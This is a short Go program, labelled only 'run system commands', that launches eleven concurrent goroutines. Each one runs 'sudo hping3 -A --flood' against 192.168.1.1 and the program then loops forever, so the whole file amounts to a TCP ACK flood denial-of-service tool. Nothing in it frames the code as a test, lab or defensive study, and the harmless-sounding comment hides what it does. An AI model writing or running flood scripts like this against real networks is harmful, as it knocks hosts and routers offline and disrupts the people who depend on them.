// run system commands

package main


import (
	"fmt"
	"time"
	"os/exec"
	"os"
)

func RunCmd() {
	// run command
	cmd := exec.Command("sudo", "hping3", "-A", "--flood", "192.168.1.1")
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	err := cmd.Run()
	if err != nil {
		fmt.Println(err)
	}
}
func main() {
	go RunCmd()
	go RunCmd()
	go RunCmd()
	go RunCmd()
	go RunCmd()
	go RunCmd()
	go RunCmd()
	go RunCmd()
	go RunCmd()
	go RunCmd()
	go RunCmd()
	for {
		time.Sleep(time.Second * 1)
	}
}

